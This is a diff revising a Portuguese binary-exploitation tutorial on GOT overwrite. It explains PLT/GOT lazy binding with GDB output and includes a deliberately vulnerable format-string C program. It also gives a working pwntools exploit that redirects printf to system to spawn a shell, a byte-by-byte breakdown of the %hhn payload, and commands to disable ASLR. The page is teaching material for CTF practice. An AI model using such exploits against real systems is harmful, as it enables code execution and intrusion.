@@ -3,399 +3,200 @@ title: GOT Overwrite
 sidebar_position: 4
 ---
 
-A GOT (Global Offset Table) é uma tabela no binário ELF que contém endereços de funções de bibliotecas compartilhadas, entre elas a `libc`. Se pudermos sobrescrever uma entrada dessa tabela, podemos ganhar execução de código.
+A GOT (Global Offset Table) guarda os endereços das funções de bibliotecas que o binário usa. Toda chamada a uma função da libc passa por um ponteiro nessa tabela. Com uma escrita arbitrária, trocamos esse ponteiro, e a próxima chamada àquela função vai para onde quisermos.
 
-Como assim? Bom, imagine o seguinte código:
-
-```c
-char buffer[20];
-gets(buffer);
-printf(buffer);
-```
-
-Se conseguirmos sobrescrever a GOT, podemos fazer o endereço de `printf` na verdade ser o endereço de `system`! E, na visão do programa:
+O exemplo clássico:
 
 ```c
-char buffer[20];
-gets(buffer);
-system(buffer);
+fgets(buffer, sizeof(buffer), stdin);
+printf(buffer);       // depois de trocar printf@got por system: system(buffer)
 ```
 
-## Funcionamento da GOT
+**Pré-requisitos**: uma vulnerabilidade de escrita arbitrária (format string, heap, índice fora dos limites) e GOT gravável, ou seja, **sem Full [RELRO](../protections.mdx#relro-relocation-read-only)**.
 
-Temos a GOT, que possui o endereço da funções externas ao código. Ela precisa ser atualizada (resolvida), pois a `libc` pode estar sendo carregada em endereços diferentes a cada execução por causa do `ASLR`. A GOT armazena os endereços absolutos das funções já resolvidas.
+## PLT e GOT
 
-Temos também a PLT (Procedure Linkage Table). Ela é intermediária entre o GOT e o programa. Sempre que você chama uma função da libc, você vai perceber que estará chamando `printf@plt` que aponta para `printf@got`. Isso é um **link**. 
+O binário não sabe em que endereço a libc será carregada. Por isso, uma chamada a `puts` é compilada como `call puts@plt`: um pequeno trecho de código (stub) na PLT (Procedure Linkage Table) que faz `jmp` para o endereço guardado em `puts@got`.
 
-Na **primeira chamada** de uma função, o *dynamic linker* (o `ld.so`, que roda no próprio processo, em modo usuário) resolve o endereço real e escreve o endereço real em `printf@got`, ou seja, na GOT. **Nas próximas chamadas**, o programa continua usando `printf@plt`, mas o GOT agora possui o endereço definitivo da função na `libc`. Esse esquema se chama *lazy binding* (resolução preguiçosa) e é o padrão com [Partial RELRO](../protections.mdx#relro-relocation-read-only).
+Com *lazy binding* (o padrão sem Full RELRO), a GOT só é preenchida na primeira chamada de cada função:
 
-Na primeira chamada:
+<Flow
+  title="Lazy binding: caminho de uma chamada a puts"
+  nodes={[
+    {id: 'libc', x: 2, y: 0, t: 'puts', sub: 'libc', kind: 'data'},
+    {id: 'code', x: 0, y: 1, t: 'call puts@plt', sub: 'código do programa'},
+    {id: 'plt', x: 1, y: 1, t: 'puts@plt', sub: 'jmp [puts@got]', kind: 'meta'},
+    {id: 'got', x: 2, y: 1, t: 'puts@got', sub: 'ponteiro gravável', kind: 'ptr'},
+    {id: 'stub', x: 2, y: 2, t: 'puts@plt+6', sub: 'push idx; jmp PLT0', kind: 'meta'},
+    {id: 'res', x: 1, y: 2, t: '_dl_runtime_resolve', sub: 'ld.so', kind: 'neutral'},
+  ]}
+  edges={[
+    {from: 'code', to: 'plt'},
+    {from: 'plt', to: 'got'},
+    {from: 'got', to: 'stub', label: '1ª chamada', dashed: true},
+    {from: 'got', to: 'libc', label: 'depois'},
+    {from: 'stub', to: 'res'},
+    {from: 'res', to: 'got', label: 'grava &puts'},
+  ]}
+/>
+
+- **Primeira chamada**: `puts@got` ainda aponta de volta para a PLT (`puts@plt+6`). Esse trecho empilha o índice da função e pula para `PLT0`, que chama `_dl_runtime_resolve` (no `ld.so`, em modo usuário). O resolvedor acha `puts` na libc, **grava o endereço na GOT** e pula para a função.
+- **Chamadas seguintes**: o `jmp [puts@got]` vai direto para a libc.
+
+Como a GOT é escrita em tempo de execução, ela fica em uma página gravável durante toda a vida do processo. Com Full RELRO, tudo é resolvido na inicialização e a página vira somente leitura.
+
+No GDB (binário de 32 bits, sem PIE):
 
 ```
-Seu Programa
-    │
-    ▼ chama printf@plt   (1ª chamada)
-    │
-PLT (Procedure Linkage Table)
-    │
-    ▼ pula para endereço em *GOT* (mas na 1ª vez, 
-    │   esse endereço aponta de volta para PLT+alguma coisa)
-    │
-GOT (Global Offset Table)  
-    │ (na 1ª vez: aponta de volta para resolver)
-    ▼
-    │
-    └─► Volta para PLT (que chama o resolvedor do linker dinâmico, _dl_runtime_resolve)
-        │
-        ▼ linker dinâmico resolve o endereço real
-        │
-        ▼ atualiza GOT com endereço REAL de printf na libc
+pwndbg> disas 0x8049040
+Dump of assembler code for function fgets@plt:
+   0x08049040 <+0>:     jmp    DWORD PTR ds:0x804c010      ← fgets@got
+   0x08049046 <+6>:     push   0x8                         ← índice da relocação
+   0x0804904b <+11>:    jmp    0x8049020                   ← PLT0
+
+pwndbg> x/wx 0x804c010                  (antes da primeira chamada)
+0x804c010 <fgets@got.plt>:      0x08049046                 ← fgets@plt+6
+
+pwndbg> x/wx 0x804c010                  (depois)
+0x804c010 <fgets@got.plt>:      0xf7ddea80                 ← fgets na libc
 ```
 
-Nas próximas chamadas:
+O comando `got` do pwndbg lista a tabela inteira com o estado de cada entrada.
 
-```
-Programa
-    │
-    ▼ chama printf@plt   
-    │
-PLT (Procedure Linkage Table)
-    │ 
-    ▼ pula para endereço em printf@got
-    │
-GOT (Global Offset Table)
-    │ 
-    ▼ contém endereço real de printf na libc 
-    │
-    └─► printf na libc (em memória)
-```
+Podemos usar a GOT para duas coisas em CTFs:
 
-Isso é importante, pois, como a GOT precisa ser escrita durante a execução, **ela fica em uma região com permissão de escrita, e nós também podemos sobrescrevê-la** (a menos que o binário tenha Full RELRO, caso em que tudo é resolvido no início e a GOT vira somente leitura).
+- **Ler** uma entrada já resolvida dá um endereço da libc (é o leak usado em [ret2libc](./rop/ret2libc.mdx)).
+- **Escrever** em uma entrada redireciona a função.
 
-Se olharmos uma chamada de função da `libc` qualquer em um binário, veremos que esta chama `função@plt`, que faz um `jmp` para o endereço guardado em `função@got`. Na primeira chamada, `função@got` estará apontando para `função@plt+6`, a instrução seguinte do próprio stub da PLT. Esse trecho empilha o índice da função e pula para o início da PLT (`PLT0`), que chama o resolvedor do linker dinâmico (`_dl_runtime_resolve`, dentro do `ld.so`). Ele descobre o endereço da função na libc, grava na GOT e pula para a função.
+## O ataque
 
-Após a primeira chamada, `função@plt` faz o `jmp` para `função@got`, que agora contém `função@libc`. Veremos isso na prática.
+<Flow
+  title="Depois da sobrescrita, toda chamada a printf executa system"
+  nodes={[
+    {id: 'sys', x: 2, y: 0, t: 'system', sub: 'system(buffer)', kind: 'danger'},
+    {id: 'code', x: 0, y: 1, t: 'call printf@plt', sub: 'printf(buffer)'},
+    {id: 'plt', x: 1, y: 1, t: 'printf@plt', sub: 'jmp [printf@got]', kind: 'meta'},
+    {id: 'got', x: 2, y: 1, t: 'printf@got', sub: 'sobrescrito', kind: 'ctrl'},
+    {id: 'pf', x: 2, y: 2, t: 'printf', sub: 'libc', kind: 'neutral'},
+  ]}
+  edges={[
+    {from: 'code', to: 'plt'},
+    {from: 'plt', to: 'got'},
+    {from: 'got', to: 'sys', label: 'agora'},
+    {from: 'got', to: 'pf', dashed: true, label: 'antes'},
+  ]}
+/>
 
+### Qual entrada sobrescrever
 
-## Sobrescrevendo GOT
+A função trocada precisa ser chamada **depois** da escrita, de preferência com um argumento que controlamos:
 
-Para fazer o GOT overwrite, precisamos de uma vulnerabilidade de **escrita arbitrária** na memória.
+| Substituir | Por | Quando |
+|---|---|---|
+| `printf`, `puts`, `strlen`, `atoi`, `free` | `system` | A função recebe nosso input como 1º argumento: vira `system(input)` |
+| `exit`, `__stack_chk_fail` | `main` ou a função vulnerável | Transformar um único disparo em um loop |
+| Qualquer função chamada adiante | `win` ou um *one_gadget* | Não é preciso controlar argumentos |
 
-Exemplos de vulnerabilidades que podemos usar:
+Cuidado ao trocar uma função que o programa usa em outros lugares antes de chegar ao ponto desejado: todas as chamadas são redirecionadas.
 
-- Format String com %n (pode escrever em qualquer endereço, inclusive em `printf@got`)
-- Heap Overflow que atinge ponteiro para GOT
-- UAF que permite modificar ponteiro de função
-
-### GOT Overwrite com Format String
-
-O exemplo abaixo é o mais simples possível para GOT Overwrite.
+## Exemplo: Format String
 
 ```c
 #include <stdio.h>
 
 void vuln() {
     char buffer[300];
-    
-    while(1) {
-        fgets(buffer, sizeof(buffer), stdin); // Impossível BOF
 
-        printf(buffer); // Vulnerabilidade Format String
+    while(1) {
+        fgets(buffer, sizeof(buffer), stdin);   // sem overflow
+        printf(buffer);                         // format string
         puts("");
     }
 }
 
 int main() {
     vuln();
-
     return 0;
 }
 ```
 
-Vemos que não é possível fazer BOF, mas temos uma Format String e o `printf` é chamado infinitamente por causa de `while(1)`. Nosso objetivo será de transformar `printf` em `system`.
+Binário de 32 bits, sem PIE, Partial RELRO. O laço dá quantas chamadas a `printf` quisermos. Plano: trocar `printf@got` por `system` e enviar `/bin/sh`.
 
-#### Analisando arquivo
-
-Se analisarmos o arquivo antes de rodar tudo, veremos que todas as call de funções na libc apontam para a PLT.
-
-```bash
-pwndbg> disas vuln
-
-...
-0x080491af <+45>:    call   0x8049040 <fgets@plt>     <<<<<
-0x080491b4 <+50>:    add    esp,0x10
-0x080491b7 <+53>:    sub    esp,0xc
-0x080491ba <+56>:    lea    eax,[ebp-0x134]
-0x080491c0 <+62>:    push   eax
-0x080491c1 <+63>:    call   0x8049030 <printf@plt>    <<<<<
-0x080491c6 <+68>:    add    esp,0x10
-0x080491c9 <+71>:    sub    esp,0xc
-0x080491cc <+74>:    lea    eax,[ebx-0x1ff8]
-0x080491d2 <+80>:    push   eax
-0x080491d3 <+81>:    call   0x8049050 <puts@plt>      <<<<<
-```
-
-Se analisarmos o `fgets@plt`:
-
-```bash
-pwndbg> x 0x8049040
-0x8049040 <fgets@plt>:  0xc01025ff
-
-pwndbg> disas 0x8049040
-Dump of assembler code for function fgets@plt:
-   0x08049040 <+0>:     jmp    DWORD PTR ds:0x804c010
-   0x08049046 <+6>:     push   0x8
-   0x0804904b <+11>:    jmp    0x8049020
-End of assembler dump.
-```
-
-Antes da primeira execução:
+### 1. Offset do buffer
 
 ```
-pwndbg> x 0x804c010
-0x804c010 <fgets@got.plt>:      0x08049046
-
-pwndbg> x 0x08049046
-0x8049046 <fgets@plt+6>:        0x00000868
-
-pwndbg> disas 0x8049046
-Dump of assembler code for function fgets@plt:
-   0x08049040 <+0>:     jmp    DWORD PTR ds:0x804c010
-   0x08049046 <+6>:     push   0x8
-   0x0804904b <+11>:    jmp    0x8049020
-End of assembler dump.
-
-pwndbg> x/2i 0x8049020
-   0x8049020:   push   DWORD PTR ds:0x804c004
-   0x8049026:   jmp    DWORD PTR ds:0x804c008
-```
-
-`0x8049020` é o início da PLT (`PLT0`). Ele empilha `GOT[1]` (um identificador do binário para o linker) e pula para `GOT[2]`, que contém o endereço de `_dl_runtime_resolve`, a função do `ld.so` que faz a resolução. O `push 0x8` que vimos em `fgets@plt+6` é o índice da `fgets` na tabela de relocações, para o resolvedor saber qual função procurar.
-
-Depois da primeira execução:
-
-```
-pwndbg> x 0x804c010
-0x804c010 <fgets@got.plt>:      0xf7ddea80
-
-pwndbg> x 0xf7ddea80
-0xf7ddea80 <fgets>:     0x57e58955
-```
-
-Agora temos `fgets` na libc. Assim, vemos na prática toda a teoria sobre PLT e GOT. As funções sempre vão apontar para `função@plt`, e o PLT sempre vai conter o endereço da `função@got`. A única coisa que é sobrescrita é a GOT.
-
-#### Encontrando offset do buffer
-
-Primeiro, vamos encontrar o offset até o começo do buffer. Lembre-se que fazemos isso apenas colocando vários `%p` até ser impresso `0x..7025..`, que é `%p` em hexadecimal (`25 70`, invertido pelo little endian). **Isso indica que chegamos no início do buffer**.
-
-```
-$./programa
-
 %p %p %p %p %p %p
 0x12c 0xf7f975c0 0x8049191 0x17 0x25207025 0x70252070
-                                        ^
-                                        |
-                                 Aqui! (little endian)
+                                ↑ "%p %" em little endian: o 5º argumento é o buffer
 ```
 
-Vemos que o 5° argumento é nosso início de buffer.
+### 2. Endereço de `printf@got`
+
+Sem PIE, é fixo:
 
 ```
-$./programa
-
-%5$p     // 0x70243525 em hexadecimal
-0x70243525
-```
-
-Agora temos certeza.
-
-#### Encontrando endereço de printf@got
-
-Se `PIE` estiver desligado no programa, podemos encontrar manualmente o endereço de `printf@got`. Podemos usar `objdump`:
-
-```
-$ objdump -R ./got_overwrite-32| grep printf      
+$ objdump -R ./got_overwrite-32 | grep printf
 0804c00c R_386_JUMP_SLOT   printf@GLIBC_2.0
-^^^^^^^^
 ```
 
-Ou podemos usar pwntools:
+No pwntools: `elf.got['printf']`.
 
-```py
->>> elf = context.binary = ELF('./got_overwrite-32')
->>> print(hex(elf.got['printf']))
-0x804c00c
-```
+### 3. Endereço de `system`
 
-Assim, `printf@got = 0x0804c00c`.
+Se o programa usasse `system` em algum lugar, bastaria `elf.plt['system']`. Aqui não usa, então precisamos do endereço na libc: `base da libc + offset de system`.
 
-#### Encontrando endereço de system@libc
+O offset vem do arquivo da libc (`libc.sym['system']` no pwntools, ou `readelf -s libc.so.6 | grep " system"`). A base depende do ambiente:
 
-Se a função `system` for declarada no programa, basta obter `system@plt`. Podemos achar isso com `objdump`
+- **Local, sem ASLR** (para estudo): a base é fixa. Veja em `ldd ./binario`, em `vmmap` no GDB, ou em `/proc/<pid>/maps`. Para desligar o ASLR temporariamente: `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space` (o valor padrão é `2`).
+- **Com ASLR / remoto**: é preciso vazar um endereço da libc na mesma execução. Com a própria format string: leia uma entrada já resolvida da GOT (`%N$s` apontando para `puts@got`) ou um endereço da libc que esteja na stack, e subtraia o offset correspondente. Use a libc do servidor para os offsets.
 
-```
-$ objdump -d -j .plt ./got_overwrite-32 | grep system
-# Vazio
-```
-
-Porém, vemos que isso não ocorre no nosso caso, já que `system` nunca é chamada e portanto nunca estará no PLT. Isso complica um pouco as coisas, pois vamos ter que obter diretamente `system@libc`. Vamos ver como obter `system@libc` localmente, e depois como obter isso em CTFs.
-
-##### Encontrando system@libc localmente
-
-1. Qual o local da libc sendo usada?
-
-```bash
-ldd ./got_overwrite-32 
-        linux-gate.so.1 (0xf7fc4000)
-        libc.so.6 => /usr/lib32/libc.so.6 (0xf7d63000)
-        /lib/ld-linux.so.2 (0xf7fc6000)
-```
-
-2. Qual o offset de `system` na libc?
-
-```bash
-$ objdump -T /usr/lib32/libc.so.6 | grep " system"
-00053660  w   DF .text  00000037  GLIBC_2.0   system
-^^^^^^^^
-```
-
-3. Qual o endereço base da libc?
-
-```bash
-# 3. Rodar programa e, em outro terminal, encontrar onde libc carrega (ASLR desligado)
-$ cat /proc/$(pidof got_overwrite-32)/maps | grep libc
-f7d63000-f7d87000 r--p 00000000 08:01 2801499                            /usr/lib32/libc.so.6
-    ↑
-  libc_base = 0xf7d63000
-
-f7d87000-f7f10000 r-xp 00024000 08:01 2801499                            /usr/lib32/libc.so.6
-f7f10000-f7f95000 r--p 001ad000 08:01 2801499                            /usr/lib32/libc.so.6
-f7f95000-f7f97000 r--p 00232000 08:01 2801499                            /usr/lib32/libc.so.6
-f7f97000-f7f98000 rw-p 00234000 08:01 2801499                            /usr/lib32/libc.so.6
-...
-```
-
-Com ASLR desligado, a libc carrega no mesmo lugar sempre. Se quiser controlar o ASLR na sua máquina:
-
-```bash
-# Desligar ASLR até reiniciar sistema
-echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
-
-# Verificar status
-cat /proc/sys/kernel/randomize_va_space
-
-# Reativar completamente (padrão)
-echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
-```
-
-Assim, temos que `libc_base = 0xf7d63000` e offset do `system = 0x53660`. Com isso, o endereço de `system` é `0xf7d63000 + 0x53660 = 0xf7db6660` (soma da base + offset).
-
-Com pwntools, precisamos apenas obter o endereço base da libc.
-
-```py
-elf = context.binary = ELF('./got_overwrite-32')
-libc = elf.libc
-
-# Endereço base da libc
-libc.address = 0xf7d63000
-
-# pwntools já possui os offsets internamente
-print(hex(libc.sym['system']))
-```
-
-##### Encontrando system@libc em CTFs
-
-Para CTFs, a questão se complica, pois não temos acesso ao computador onde o arquivo está. Assim, não podemos ver o endereço base da `libc` que nos permite achar `system@libc`. A solução é **vazar qualquer coisa dentro da libc e usar o offset deste item vazado para achar o endereço base da `libc`**.
-
-Ter que vazar a libc costuma ser muito comum em CTFs.
-
-#### Fazendo payload
-
-O pwntools já possui um construtor de payload de `%n` para format strings nativo que facilita bastante o trabalho.
+### 4. Exploit
 
 ```py
 from pwn import *
 
 elf = context.binary = ELF('./got_overwrite-32')
 libc = elf.libc
-# Endereço base da libc (ASLR desabilitado)
-libc.address = 0xf7d63000
+libc.address = 0xf7d63000          # ASLR desligado. Com ASLR, calcule a partir de um leak
 
 p = process()
 
-# fmtstr_payload(n° argumento, {onde escrever : o que escrever})
-payload = fmtstr_payload(5, {elf.got['printf'] : libc.sym['system']})
+# fmtstr_payload(offset do buffer, {onde escrever: o que escrever})
+payload = fmtstr_payload(5, {elf.got['printf']: libc.sym['system']})
 p.sendline(payload)
 
-# Após 1 loop, voltamos ao printf novamente, que agora é system!
-p.sendline(b'/bin/sh') # printf(buffer) virou system("/bin/sh\n")
-
+p.sendline(b'/bin/sh')             # na próxima volta do laço: printf(buffer) → system("/bin/sh\n")
 p.interactive()
 ```
 
-(O `\n` que o `fgets` deixa no fim da string não atrapalha: `system("/bin/sh\n")` funciona do mesmo jeito.)
+O `\n` que o `fgets` deixa no fim não atrapalha o `system`.
 
-#### Analisando o payload
+## Por dentro do payload
 
-O pwntools gera o payload automaticamente. Mas o que ele realmente está fazendo? O payload enviado foi:
-
-```
-%96c%16$hhn%6c%17$hhn%117c%18$hhn%28c%19$hhn\x0c\xc0\x04\x08\r\xc0\x04\x08\x0e\xc0\x04\x08\x0f\xc0\x04\x08
-```
-
-Vale lembrar os endereços que encontramos.
-
-- `printf@got`  = `0x804c00c`
-- `system@libc` = `0xf7db6660`
-
-##### Parte 1: Format String
-
-A format string enviada possui 44 caracteres = 44 bytes.
+O `fmtstr_payload` gerou, para `printf@got = 0x0804c00c` e `system = 0xf7db6660`:
 
 ```
-%96c%16$hhn%6c%17$hhn%117c%18$hhn%28c%19$hhn
+%96c%16$hhn%6c%17$hhn%117c%18$hhn%28c%19$hhn\x0c\xc0\x04\x08\x0d\xc0\x04\x08\x0e\xc0\x04\x08\x0f\xc0\x04\x08
 ```
 
-Separando, conseguimos entender melhor.
+São quatro escritas de 1 byte (`%hhn`), uma para cada byte do endereço:
 
-```
-%96c        → escreve 96 (0x60) caracteres
-%16$hhn     → escreve o número total de bytes impressos até aqui no endereço apontado pelo 16º argumento
+| Trecho | Contador após imprimir | Grava em | Byte |
+|---|---|---|---|
+| `%96c%16$hhn` | 96 = `0x60` | `0x0804c00c` (arg 16) | `60` |
+| `%6c%17$hhn` | 102 = `0x66` | `0x0804c00d` (arg 17) | `66` |
+| `%117c%18$hhn` | 219 = `0xdb` | `0x0804c00e` (arg 18) | `db` |
+| `%28c%19$hhn` | 247 = `0xf7` | `0x0804c00f` (arg 19) | `f7` |
 
-%6c         → adiciona 6 caracteres (total = 102 = 0x66)
-%17$hhn     → escreve no endereço do 17º argumento
+Resultado em memória: `60 66 db f7` = `0xf7db6660`.
 
-%117c       → adiciona 117 caracteres (total = 219 = 0xdb)
-%18$hhn     → escreve no endereço do 18º argumento
+**Por que argumento 16?** A format string tem 44 bytes, que ocupam `44 / 4 = 11` argumentos a partir do 5º. Os endereços começam em `5 + 11 = 16`. Quando o tamanho não é múltiplo de 4 (8 em 64 bits), o pwntools acrescenta padding para alinhar.
 
-%28c        → adiciona 28 caracteres (total = 247 = 0xf7)
-%19$hhn     → escreve no endereço do 19º argumento
-```
+**Ordem dos bytes.** O contador do `%n` só cresce. Aqui os bytes já estão em ordem crescente (`60 < 66 < db < f7`). Quando não estão, o pwntools reordena as escritas ou usa o estouro do `%hhn`: como só o byte baixo do contador é gravado, imprimir até `0x130` grava `0x30`.
 
-Lembre-se que **`%hhn` escreve apenas 1 byte (0x00 - 0xff) no endereço apontado** (veja [Format Strings - Tipos de Format Strings](./format-strings.md#tipos-de-format-strings)). Assim, estamos escrevendo o endereço de `system@libc` em `printf@got` byte a byte!
-
-Isso evita ter que usar números muito grandes e facilita o processo. Note também que usar `%n` exige que escrevamos os bytes em ordem crescente, já que somente podemos adicionar caracteres à contagem do `%n`, nunca retirar. Se o endereço a ser escrito não estivesse com os bytes em ordem crescente (como `0x000030d6`, `d6` é maior que `30` e `30` é maior que `00` e `00`), bastaria alterar a ordem dos parâmetros (o pwntools faz isso automaticamente). Outro truque: como o `%hhn` só grava o byte menos significativo do contador, imprimir 256 caracteres é o mesmo que imprimir 0. Então, para "voltar" de `0xf7` para `0x30`, basta imprimir `0x130 - 0xf7` caracteres.
-
-##### Parte 2: Endereços
-
-Cada `%hhn` está escrevendo apenas 1 byte. Assim, temos que selecionar o byte que queremos escrever de `printf@got` para cada `%hhn`.
-
-```
-\x0c\xc0\x04\x08  → 0x0804c00c (printf@got + 0) (16° Parâmetro)
-\r\xc0\x04\x08    → 0x0804c00d (printf@got + 1) (17° Parâmetro)
-\x0e\xc0\x04\x08  → 0x0804c00e (printf@got + 2) (18° Parâmetro)
-\x0f\xc0\x04\x08  → 0x0804c00f (printf@got + 3) (19° Parâmetro)
-```
-
-Por que 16° parâmetro, se o início do buffer era o 5° parâmetro? Aí que está, colocamos várias format strings no início do buffer, então temos que pular elas.
-
-Lembra que temos 44 caracteres = 44 bytes? Bom, 44 / 4 bytes (x86) nos dá 11 parâmetros. **Assim, a format string está ocupando 11 parâmetros**, já que a cada 4 bytes temos um parâmetro. Pulamos isso fazendo 5 + 11 = 16. Portanto, o 16° parâmetro é o primeiro endereço (printf@got + 0).
-
-Em alguns payloads gerados pelo pwntools, você vai perceber que ele coloca `aaa` de padding ao final da format string. Isso ocorre pois ele está deixando a format string alinhada em 4 bytes (8 em 64 bits), para o parâmetro do endereço ser capturado corretamente e não pela metade.
-
-Em 64 bits, o processo é o mesmo, com duas diferenças: os parâmetros têm 8 bytes (então a format string ocupa `len / 8` parâmetros) e os endereços contêm bytes nulos, por isso eles precisam ficar **depois** da format string (o `fmtstr_payload` já faz isso quando `context.bits == 64`).
+Em 64 bits a lógica é a mesma, com argumentos de 8 bytes e os endereços **sempre depois** da format string, por causa dos bytes nulos (veja [Format Strings](./format-strings.md#escrita-arbitrária)).
 
 ## Créditos
 
-- [Ir0nstone](https://ir0nstone.gitbook.io/notes/binexp/stack/got-overwrite/exploiting-a-got-overwrite) - Binário e excelente explicação
-- [Ian](https://ian.nl/blog/format-string-got-overwrite-attack) - Aprofundamento no payload do pwntools
+- [Ir0nstone](https://ir0nstone.gitbook.io/notes/binexp/stack/got-overwrite/exploiting-a-got-overwrite): binário de exemplo
+- [Ian](https://ian.nl/blog/format-string-got-overwrite-attack): análise do payload do pwntools
